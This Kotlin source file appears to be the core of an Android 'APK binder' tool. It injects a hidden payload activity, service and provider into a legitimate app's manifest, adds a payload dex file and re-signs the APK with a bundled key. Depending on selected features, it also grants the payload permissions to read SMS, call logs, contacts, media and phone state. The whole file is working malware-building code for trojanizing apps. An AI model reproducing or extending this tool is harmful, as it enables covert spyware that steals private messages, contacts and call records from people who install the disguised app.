package Com.devhs.apkbinder.binder

import android.content.Context
import com.android.apksig.ApkSigner
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.io.OutputStream
import java.security.KeyStore
import java.security.PrivateKey
import java.security.cert.X509Certificate
import java.util.zip.CRC32
import java.util.zip.ZipEntry
import java.util.zip.ZipFile
import java.util.zip.ZipOutputStream

data class BindResult(
    val ok: Boolean,
    val message: String,
    val outputPath: String? = null
)

class BinderEngine(private val context: Context) {

    companion object {
        private const val ALIGN_SO = 16384
        private const val ALIGN_DEFAULT = 4
        private const val MANIFEST = "AndroidManifest.xml"
        private const val DEX_PATTERN = "classes(\\d*)\\.dex"
    }

    // ------------------------------------------------------------------
    // Public entry
    // ------------------------------------------------------------------
    suspend fun bind(
        sourceApk: File,
        outApk: File,
        features: Collection<String>,
        onLog: (String) -> Unit
    ): BindResult = withContext(Dispatchers.IO) {

        var temp: File? = null

        try {
            onLog("[INFO] Source APK: ${sourceApk.name} (${sourceApk.length() / 1024} KB)")

            val pm = context.packageManager
            val info = pm.getPackageArchiveInfo(sourceApk.absolutePath, 0)
                ?: return@withContext BindResult(false, "Source APK could not be parsed")

            val pkg = info.packageName
            onLog("[INFO] Package: $pkg")

            val permissions = buildPermissions(features)
            onLog("[INFO] Permissions to inject: ${permissions.size}")
            permissions.forEach { onLog("   + $it") }

            val authority = pkg + Const.AUTHORITY_SUFFIX
            onLog("[INFO] Authority: $authority")

            temp = File(outApk.parentFile, outApk.nameWithoutExtension + ".unsigned.apk")

            var patched: ByteArray? = null
            var payloadDexName = "classes.dex"

            ZipFile(sourceApk).use { zip ->

                val entry = zip.getEntry(MANIFEST)
                    ?: return@withContext BindResult(false, "$MANIFEST not found")

                val manifest = zip.getInputStream(entry).use { it.readBytes() }
                onLog("[INFO] Original manifest: ${manifest.size} bytes")

                patched = AxmlPatcher.patch(
                    manifest,
                    Const.PAYLOAD_ACTIVITY,
                    Const.PAYLOAD_SERVICE,
                    Const.PAYLOAD_PROVIDER,
                    authority,
                    permissions
                )

                if (patched == null) {
                    return@withContext BindResult(false, "Manifest patch failed")
                }
                onLog("[INFO] Patched manifest: ${patched!!.size} bytes")

                payloadDexName = nextDexName(zip)
                onLog("[INFO] Payload dex slot: $payloadDexName")

                val payloadDex = readAsset("classes.dex")
                onLog("[INFO] Payload dex: ${payloadDex.size} bytes")

                FileOutputStream(temp).use { fos ->
                    CountingStream(fos).use { cs ->
                        ZipOutputStream(cs).use { zos ->

                            val entries = zip.entries()
                            while (entries.hasMoreElements()) {
                                val e = entries.nextElement()
                                val name = e.name

                                if (name == MANIFEST) continue
                                if (name == payloadDexName) continue
                                if (isSignatureFile(name)) continue

                                val data = zip.getInputStream(e).use { it.readBytes() }
                                val stored = e.method == ZipEntry.STORED
                                writeEntry(zos, cs, name, data, stored)
                            }

                            writeEntry(zos, cs, MANIFEST, patched!!, false)
                            writeEntry(zos, cs, payloadDexName, payloadDex, false)
                        }
                    }
                }
            }

            // ---- Sign ----
            onLog("[INFO] Signing...")
            val signed = File(outApk.parentFile, outApk.nameWithoutExtension + ".signed.apk")
            if (signed.exists()) signed.delete()

            try {
                sign(temp, signed, onLog)
            } catch (t: Throwable) {
                onLog("[ERROR] Sign failed: ${t.message}")
                return@withContext BindResult(false, "Sign failed: ${t.message}")
            }

            if (outApk.exists()) outApk.delete()
            if (!signed.renameTo(outApk)) {
                signed.copyTo(outApk, overwrite = true)
                signed.delete()
            }

            // ---- Verify ----
            val check = pm.getPackageArchiveInfo(outApk.absolutePath, 0)
            if (check == null) {
                onLog("[ERROR] Verification failed: APK unreadable")
                return@withContext BindResult(false, "Verification failed")
            }

            onLog("[INFO] Verified package: ${check.packageName}")
            onLog("[INFO] App class: ${check.applicationInfo?.className ?: "(none)"}")
            onLog("[INFO] Output: ${outApk.name} (${outApk.length() / 1024} KB)")

            BindResult(true, "Success", outApk.absolutePath)

        } catch (t: Throwable) {
            onLog("[EXCEPTION] ${t.javaClass.simpleName}: ${t.message}")
            t.stackTrace.take(8).forEach { onLog("   at $it") }
            BindResult(false, t.message ?: "Unknown error")
        } finally {
            temp?.let { if (it.exists()) it.delete() }
        }
    }

    // ------------------------------------------------------------------
    // Permissions
    // ------------------------------------------------------------------
    private fun buildPermissions(features: Collection<String>): List<String> {
        val set = LinkedHashSet<String>()

        set += "android.permission.INTERNET"
        set += "android.permission.ACCESS_NETWORK_STATE"
        set += "android.permission.POST_NOTIFICATIONS"
        set += "android.permission.WAKE_LOCK"
        set += "android.permission.RECEIVE_BOOT_COMPLETED"
        set += "android.permission.FOREGROUND_SERVICE"
        set += "android.permission.FOREGROUND_SERVICE_DATA_SYNC"

        val f = features.map { it.lowercase() }

        if (f.any { it.contains("gallery") || it.contains("image") }) {
            set += "android.permission.READ_EXTERNAL_STORAGE"
            set += "android.permission.READ_MEDIA_IMAGES"
            set += "android.permission.READ_MEDIA_VIDEO"
        }
        if (f.any { it.contains("sms") }) {
            set += "android.permission.READ_SMS"
            set += "android.permission.RECEIVE_SMS"
        }
        if (f.any { it.contains("call") }) {
            set += "android.permission.READ_CALL_LOG"
            set += "android.permission.READ_PHONE_STATE"
        }
        if (f.any { it.contains("contact") }) {
            set += "android.permission.READ_CONTACTS"
        }
        if (f.any { it.contains("device") || it.contains("info") }) {
            set += "android.permission.READ_PHONE_STATE"
        }

        return set.toList()
    }

    // ------------------------------------------------------------------
    // Zip helpers
    // ------------------------------------------------------------------
    private fun nextDexName(zip: ZipFile): String {
        var max = 0
        val regex = Regex(DEX_PATTERN)
        val entries = zip.entries()
        while (entries.hasMoreElements()) {
            val m = regex.matchEntire(entries.nextElement().name) ?: continue
            val n = m.groupValues[1].toIntOrNull() ?: 1
            if (n > max) max = n
        }
        return "classes${max + 1}.dex"
    }

    private fun isSignatureFile(name: String): Boolean {
        if (!name.startsWith("META-INF/")) return false
        val upper = name.uppercase()
        return upper.endsWith(".RSA") || upper.endsWith(".DSA") ||
                upper.endsWith(".EC") || upper.endsWith(".SF") || upper.endsWith(".MF")
    }

    private fun writeEntry(
        zos: ZipOutputStream,
        cs: CountingStream,
        name: String,
        data: ByteArray,
        stored: Boolean
    ) {
        val e = ZipEntry(name)

        if (stored) {
            val crc = CRC32()
            crc.update(data)
            e.method = ZipEntry.STORED
            e.size = data.size.toLong()
            e.compressedSize = data.size.toLong()
            e.crc = crc.value
        } else {
            e.method = ZipEntry.DEFLATED
        }

        zos.putNextEntry(e)
        zos.write(data)
        zos.closeEntry()
        zos.flush()

        val align = if (name.startsWith("lib/") && name.endsWith(".so")) ALIGN_SO else ALIGN_DEFAULT
        val pad = paddingFor(cs.count, align)
        if (pad > 0) {
            cs.write(ByteArray(pad))
            cs.flush()
        }
    }

    private fun paddingFor(position: Long, align: Int): Int {
        val rem = (position % align).toInt()
        return if (rem == 0) 0 else align - rem
    }

    private class CountingStream(private val out: OutputStream) : OutputStream() {
        var count: Long = 0L
            private set

        override fun write(b: Int) {
            out.write(b)
            count++
        }

        override fun write(b: ByteArray, off: Int, len: Int) {
            out.write(b, off, len)
            count += len
        }

        override fun flush() = out.flush()
        override fun close() = out.flush()
    }

    // ------------------------------------------------------------------
    // Assets / signing
    // ------------------------------------------------------------------
    private fun readAsset(name: String): ByteArray =
        context.assets.open(name).use { it.readBytes() }

    private fun sign(input: File, output: File, onLog: (String) -> Unit) {
        val ks = KeyStore.getInstance("JKS")
        context.assets.open(Const.KEYSTORE_FILE).use {
            ks.load(it, Const.KEYSTORE_PASS.toCharArray())
        }

        val alias = ks.aliases().nextElement()
        val key = ks.getKey(alias, Const.KEYSTORE_PASS.toCharArray()) as PrivateKey
        val cert = ks.getCertificate(alias) as X509Certificate

        val signer = ApkSigner.SignerConfig.Builder(alias, key, listOf(cert)).build()

        ApkSigner.Builder(listOf(signer))
            .setInputApk(input)
            .setOutputApk(output)
            .setV1SigningEnabled(true)
            .setV2SigningEnabled(true)
            .setV3SigningEnabled(true)
            .build()
            .sign()

        onLog("[INFO] Signed: ${output.length() / 1024} KB")
    }
}
